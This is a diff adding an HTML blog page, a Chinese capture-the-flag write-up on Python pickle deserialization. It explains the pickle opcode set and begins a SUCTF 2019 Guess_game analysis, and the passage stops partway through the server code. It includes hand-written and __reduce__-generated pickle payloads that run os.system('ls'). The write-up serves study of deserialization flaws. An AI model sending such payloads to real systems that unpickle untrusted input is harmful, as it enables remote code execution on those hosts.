@@ -1,0 +1,1665 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="wywwzjj">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="wywwzjj">
+    
+    <meta name="keywords" content="wywwzjj,wywwzjj ctf,wywwzjj blog,wywwzjj rois,rois wywwzjj">
+    
+    <meta name="description" content>
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <title>Python pickle 反序列化实例分析 · wywwzjj&#39;s Blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="stylesheet" href="/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href="/assets/B.ico">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/">wywwzjj&#39;s Blog.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">Python pickle 反序列化实例分析</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href="/">wywwzjj's Blog.</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            Python pickle 反序列化实例分析
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class="post-intro-tags">
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="Writeup">Writeup</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="反序列化">反序列化</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">4.8k</span>阅读时长: <span class="post-count reading-time">23 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2019/10/24</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前 SUCTF 出了一题 pickle 反序列化的杂项题，就感觉相当有意思。后来 Balsn 一次性搞了三个，太强了，学到了很多，感谢这些师傅。下文记录了我的学习笔记以及踩过的坑，希望对大家理解 pickle 有点帮助。</p>
+<p>这个 PPT 一定要好好看看，非常的通俗易懂。<br><a href="https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf" target="_blank" rel="noopener">https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf</a></p>
+<h2 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h2><blockquote>
+<p>Python 提供了两个库，pickle 和 cPickle（其中 cpickle 底层使用 c 语言书写）</p>
+<p>用 pycharm 调试的话需要更改一下代码，pyckle.py 的第 1607 行</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="comment"># Use the faster _pickle if possible</span></span><br><span class="line">&gt; <span class="keyword">try</span>:</span><br><span class="line">&gt;     	<span class="keyword">from</span> _pickle <span class="keyword">import</span> ( ...  <span class="comment"># 这里 _pickle =&gt; pickle</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h3 id="序列化过程"><a href="#序列化过程" class="headerlink" title="序列化过程"></a>序列化过程</h3><ul>
+<li>从对象中提取所有属性（<code>__dict__</code>），并将属性转为键值对</li>
+<li>写入对象的类名</li>
+<li>写入键值对</li>
+</ul>
+<h3 id="反序列化过程"><a href="#反序列化过程" class="headerlink" title="反序列化过程"></a>反序列化过程</h3><ul>
+<li>获取 pickle 输入流</li>
+<li>重建属性列表</li>
+<li>根据保存的类名创建一个新的对象</li>
+<li>将属性复制到新的对象中</li>
+</ul>
+<h2 id="pickle-是什么？"><a href="#pickle-是什么？" class="headerlink" title="pickle 是什么？"></a>pickle 是什么？</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>pickle 是一种栈语言，有不同的编写方式，基于一个轻量的 PVM（Pickle Virtual Machine）。</p>
+<p>PVM 由三部分组成：</p>
+<ul>
+<li><p><strong>指令处理器</strong></p>
+<p>  从流中读取 opcode 和参数，并对其进行解释处理。重复这个动作，直到遇到 <code>.</code> 这个结束符后停止。</p>
+<p>  最终留在栈顶的值将被作为反序列化对象返回。</p>
+</li>
+<li><p><strong>stack</strong></p>
+<p>  由 Python 的 <strong>list</strong> 实现，被用来临时存储数据、参数以及对象。</p>
+</li>
+<li><p><strong>memo</strong></p>
+<p>  由 Python 的 <strong>dict</strong> 实现，为 PVM 的整个生命周期提供存储。</p>
+</li>
+</ul>
+<p><strong>PS</strong>：注意下 stack、memo 的实现方式，方便理解下面的指令。</p>
+<blockquote>
+<p>当前用于 pickling 的协议共有 5 种。使用的协议版本越高，读取生成的 pickle 所需的 Python 版本就要越新。</p>
+<ul>
+<li>v0 版协议是原始的 “人类可读” 协议，并且向后兼容早期版本的 Python。</li>
+<li>v1 版协议是较早的二进制格式，它也与早期版本的 Python 兼容。</li>
+<li>v2 版协议是在 Python 2.3 中引入的。它为存储 <a href="https://docs.python.org/zh-cn/3/glossary.html#term-new-style-class" target="_blank" rel="noopener">new-style class</a> 提供了更高效的机制。欲了解有关第 2 版协议带来的改进，请参阅 <a href="https://www.python.org/dev/peps/pep-0307" target="_blank" rel="noopener"><strong>PEP 307</strong></a>。</li>
+<li>v3 版协议添加于 Python 3.0。它具有对 <a href="https://docs.python.org/zh-cn/3/library/stdtypes.html#bytes" target="_blank" rel="noopener"><code>bytes</code></a> 对象的显式支持，且无法被 Python 2.x 打开。这是目前默认使用的协议，也是在要求与其他 Python 3 版本兼容时的推荐协议。</li>
+<li>v4 版协议添加于 Python 3.4。它支持存储非常大的对象，能存储更多种类的对象，还包括一些针对数据格式的优化。有关第 4 版协议带来改进的信息，请参阅 <a href="https://www.python.org/dev/peps/pep-3154" target="_blank" rel="noopener"><strong>PEP 3154</strong></a>。</li>
+</ul>
+</blockquote>
+<h3 id="指令集"><a href="#指令集" class="headerlink" title="指令集"></a>指令集</h3><blockquote>
+<p>本文重点说明 0 号协议，不明白的指令建议直接看对应实现！</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">MARK           = <span class="string">b'('</span>   <span class="comment"># push special markobject on stack</span></span><br><span class="line">STOP           = <span class="string">b'.'</span>   <span class="comment"># every pickle ends with STOP</span></span><br><span class="line">POP            = <span class="string">b'0'</span>   <span class="comment"># discard topmost stack item</span></span><br><span class="line">POP_MARK       = <span class="string">b'1'</span>   <span class="comment"># discard stack top through topmost markobject</span></span><br><span class="line">DUP            = <span class="string">b'2'</span>   <span class="comment"># duplicate top stack item</span></span><br><span class="line">FLOAT          = <span class="string">b'F'</span>   <span class="comment"># push float object; decimal string argument</span></span><br><span class="line">INT            = <span class="string">b'I'</span>   <span class="comment"># push integer or bool; decimal string argument</span></span><br><span class="line">BININT         = <span class="string">b'J'</span>   <span class="comment"># push four-byte signed int</span></span><br><span class="line">BININT1        = <span class="string">b'K'</span>   <span class="comment"># push 1-byte unsigned int</span></span><br><span class="line">LONG           = <span class="string">b'L'</span>   <span class="comment"># push long; decimal string argument</span></span><br><span class="line">BININT2        = <span class="string">b'M'</span>   <span class="comment"># push 2-byte unsigned int</span></span><br><span class="line">NONE           = <span class="string">b'N'</span>   <span class="comment"># push None</span></span><br><span class="line">PERSID         = <span class="string">b'P'</span>   <span class="comment"># push persistent object; id is taken from string arg</span></span><br><span class="line">BINPERSID      = <span class="string">b'Q'</span>   <span class="comment">#  "       "         "  ;  "  "   "     "  stack</span></span><br><span class="line">REDUCE         = <span class="string">b'R'</span>   <span class="comment"># apply callable to argtuple, both on stack</span></span><br><span class="line">STRING         = <span class="string">b'S'</span>   <span class="comment"># push string; NL-terminated string argument</span></span><br><span class="line">BINSTRING      = <span class="string">b'T'</span>   <span class="comment"># push string; counted binary string argument</span></span><br><span class="line">SHORT_BINSTRING= <span class="string">b'U'</span>   <span class="comment">#  "     "   ;    "      "       "      " &lt; 256 bytes</span></span><br><span class="line">UNICODE        = <span class="string">b'V'</span>   <span class="comment"># push Unicode string; raw-unicode-escaped'd argument</span></span><br><span class="line">BINUNICODE     = <span class="string">b'X'</span>   <span class="comment">#   "     "       "  ; counted UTF-8 string argument</span></span><br><span class="line">APPEND         = <span class="string">b'a'</span>   <span class="comment"># append stack top to list below it</span></span><br><span class="line">BUILD          = <span class="string">b'b'</span>   <span class="comment"># call __setstate__ or __dict__.update()</span></span><br><span class="line">GLOBAL         = <span class="string">b'c'</span>   <span class="comment"># push self.find_class(modname, name); 2 string args</span></span><br><span class="line">DICT           = <span class="string">b'd'</span>   <span class="comment"># build a dict from stack items</span></span><br><span class="line">EMPTY_DICT     = <span class="string">b'&#125;'</span>   <span class="comment"># push empty dict</span></span><br><span class="line">APPENDS        = <span class="string">b'e'</span>   <span class="comment"># extend list on stack by topmost stack slice</span></span><br><span class="line">GET            = <span class="string">b'g'</span>   <span class="comment"># push item from memo on stack; index is string arg</span></span><br><span class="line">BINGET         = <span class="string">b'h'</span>   <span class="comment">#   "    "    "    "   "   "  ;   "    " 1-byte arg</span></span><br><span class="line">INST           = <span class="string">b'i'</span>   <span class="comment"># build &amp; push class instance</span></span><br><span class="line">LONG_BINGET    = <span class="string">b'j'</span>   <span class="comment"># push item from memo on stack; index is 4-byte arg</span></span><br><span class="line">LIST           = <span class="string">b'l'</span>   <span class="comment"># build list from topmost stack items</span></span><br><span class="line">EMPTY_LIST     = <span class="string">b']'</span>   <span class="comment"># push empty list</span></span><br><span class="line">OBJ            = <span class="string">b'o'</span>   <span class="comment"># build &amp; push class instance</span></span><br><span class="line">PUT            = <span class="string">b'p'</span>   <span class="comment"># store stack top in memo; index is string arg</span></span><br><span class="line">BINPUT         = <span class="string">b'q'</span>   <span class="comment">#   "     "    "   "   " ;   "    " 1-byte arg</span></span><br><span class="line">LONG_BINPUT    = <span class="string">b'r'</span>   <span class="comment">#   "     "    "   "   " ;   "    " 4-byte arg</span></span><br><span class="line">SETITEM        = <span class="string">b's'</span>   <span class="comment"># add key+value pair to dict</span></span><br><span class="line">TUPLE          = <span class="string">b't'</span>   <span class="comment"># build tuple from topmost stack items</span></span><br><span class="line">EMPTY_TUPLE    = <span class="string">b')'</span>   <span class="comment"># push empty tuple</span></span><br><span class="line">SETITEMS       = <span class="string">b'u'</span>   <span class="comment"># modify dict by adding topmost key+value pairs</span></span><br><span class="line">BINFLOAT       = <span class="string">b'G'</span>   <span class="comment"># push float; arg is 8-byte float encoding</span></span><br><span class="line"></span><br><span class="line">TRUE           = <span class="string">b'I01\n'</span>  <span class="comment"># not an opcode; see INT docs in pickletools.py</span></span><br><span class="line">FALSE          = <span class="string">b'I00\n'</span>  <span class="comment"># not an opcode; see INT docs in pickletools.py</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="如何生成-pickle？"><a href="#如何生成-pickle？" class="headerlink" title="如何生成 pickle？"></a>如何生成 pickle？</h2><h3 id="手写"><a href="#手写" class="headerlink" title="手写"></a>手写</h3><p>基本模式：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c<span class="tag">&lt;<span class="name">module</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">callable</span>&gt;</span></span><br><span class="line">(<span class="tag">&lt;<span class="name">args</span>&gt;</span></span><br><span class="line">tR</span><br></pre></td></tr></table></figure>
+
+<p>看个小例子：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">cos</span><br><span class="line">system</span><br><span class="line">(S<span class="string">'ls'</span></span><br><span class="line">tR.</span><br><span class="line"></span><br><span class="line">&lt;=&gt; __import__('os').system(*('ls',))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分解一下：</span></span><br><span class="line">cos</span><br><span class="line">system  =&gt;  引入 system，并将函数添加到 stack</span><br><span class="line"></span><br><span class="line">(S'ls'	=&gt;  把当前 stack 存到 metastack，清空 stack，再将 'ls' 压入 stack</span><br><span class="line">t		=&gt;  stack 中的值弹出并转为 tuple，把 metastack 还原到 stack，再将 tuple 压入 stack</span><br><span class="line"><span class="comment"># 简单来说，(,t 之间的内容形成了一个 tuple，stack 目前是 [&lt;built-in function system&gt;, ('ls',)]</span></span><br><span class="line">R 		=&gt;  system(*('ls',))</span><br><span class="line">.		=&gt;  结束，返回当前栈顶元素</span><br></pre></td></tr></table></figure>
+
+<h3 id="reduce"><a href="#reduce" class="headerlink" title="_reduce_"></a>_<em>reduce_</em></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os, pickle</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(<span class="string">'ls'</span>,))</span><br><span class="line">    </span><br><span class="line">print(pickle.dumps(Test(), protocol=<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">b'cnt\nsystem\np0\n(Vls\np1\ntp2\nRp3\n.'</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>
+
+<p>缺点：只能执行单一的函数，很难构造复杂的操作，下文的讲解都是直接写。</p>
+<h2 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h2><h3 id="SUCTF-2019-Guess-game"><a href="#SUCTF-2019-Guess-game" class="headerlink" title="SUCTF 2019 Guess_game"></a>SUCTF 2019 Guess_game</h3><blockquote>
+<p>完整源码：<a href="https://github.com/team-su/SUCTF-2019/tree/master/Misc/guess_game" target="_blank" rel="noopener">https://github.com/team-su/SUCTF-2019/tree/master/Misc/guess_game</a></p>
+</blockquote>
+<p>猜数游戏，10 以内的数字，猜对十次就返回 flag。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># file: Ticket.py</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ticket</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, number)</span>:</span></span><br><span class="line">        self.number = number</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__eq__</span><span class="params">(self, other)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> type(self) == type(other) <span class="keyword">and</span> self.number == other.number:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_valid</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">assert</span> type(self.number) == int</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> number_range &gt;= self.number &gt;= <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">       </span><br><span class="line"><span class="comment"># file: game_client.py</span></span><br><span class="line">number = input(<span class="string">'Input the number you guess\n&gt; '</span>)</span><br><span class="line">ticket = Ticket(number)</span><br><span class="line">ticket = pickle.dumps(ticket)</span><br><span class="line">writer.write(pack_length(len(ticket)))</span><br><span class="line">writer.write(ticket)</span><br></pre></td></tr></table></figure>
+
+<p>client 端接收数字输入，生成的 Ticket 对象序列化后发送给 server 端。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># file: game_server.py 有删减</span></span><br><span class="line"><span class="keyword">from</span> guess_game.Ticket <span class="keyword">import</span> Ticket</span><br><span class="line"><span class="keyword">from</span> guess_game.RestrictedUnpickler <span class="keyword">import</span> restricted_loads</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> unpack</span><br><span class="line"><span class="keyword">from</span> guess_game <span class="keyword">import</span> game</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> game.finished():</span><br><span class="line">	ticket = stdin_read(length)</span><br><span class="line">    ticket = restricted_loads(ticket)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> type(ticket) == Ticket</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> ticket.is_valid():</span><br><span class="line">        print(<span class="string">'The number is invalid.'</span>)</span><br><span class="line">        game.next_game(Ticket(<span class="number">-1</span>))</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    win = game.next_game(ticket)</span><br><span class="line">    <span class="keyword">if</span> win:</span><br><span class="line">        text = 